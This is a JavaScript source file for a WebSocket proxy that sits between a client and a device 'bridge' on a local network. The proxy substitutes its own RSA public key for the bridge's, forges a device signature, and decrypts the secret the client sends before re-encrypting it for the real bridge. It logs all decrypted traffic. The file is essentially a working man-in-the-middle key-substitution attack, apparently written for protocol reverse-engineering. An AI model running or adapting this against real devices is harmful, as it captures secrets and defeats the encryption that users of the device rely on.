import WebSocket from 'ws';
import { WebSocketServer } from 'ws';
import bridgeCrypto  from './bridge.js';

const bc = bridgeCrypto();

const wss = new WebSocketServer({ port: 8080 });

wss.on('connection', function connection(wsclient) {
    
    var deviceId;
    var publicKey;

    console.log('Client connected');
    var wsserver = new WebSocket('ws://192.168.1.166');
    
    wsclient.on('message', function message(data) {
    
        var dataString = data.toString();
        if(dataString.charAt(0) === '{')
        {
            console.log('client: %s', dataString);
            var last = dataString.lastIndexOf('}');
            
            if(dataString.length >= last+2)
            {
                var trimmed = dataString.substring(last+2);
                dataString = dataString.substring(0,last+1);
            }
                        
            var msg = JSON.parse(dataString);
            if(msg["type_int"] == 16)
            {
                // Intercept the secret, and then re-encrypt it with the key we got from the actual bridge
                bc.rsaDecrypt(msg["payload"]["secret"]);                
                msg["payload"]["secret"] = bc.rsaEncrypt(publicKey);
                data = Buffer.from(JSON.stringify(msg) + trimmed);                
            }                        
        } 
        
        console.log('CLIENT: %s', bc.getcontent(data));                    
        wsserver.send(data);
        
    });

  wsserver.on('message', function message(data) {
    var dataString = data.toString();
    if(dataString.charAt(0) === '{')
    {        
        var last = dataString.lastIndexOf('}');
            
        if(dataString.length >= last+2)
        {
            var trimmed = dataString.substring(last+2);
            dataString = dataString.substring(0,last+1);
        }
        
        var msg = JSON.parse(dataString);
        if(msg["type_int"] == 10)
        {
            deviceId = msg["payload"]["device_id"];
        }

        if(msg["type_int"] == 15)
        {
            // Intercept the key from the actual bridge and replace it with 
            // our own keypair(private.pem/public.pem files in this folder)
            // Store the actual bridge key so that we can re-encrypt the secret
            // Using the key from the bridge.
            publicKey = msg["payload"]["public_key"];            
            msg["payload"]["public_key"] = bc.publicKey;
            msg["payload"]["device_signature"] = bc.createSignature(deviceId);
            data = Buffer.from(JSON.stringify(msg) + trimmed);        
        }        
    }  
    console.log("SERVER: %s", bc.getcontent(data));
    wsclient.send(data);      
  });  
});


console.log("Started, listening on port 8080");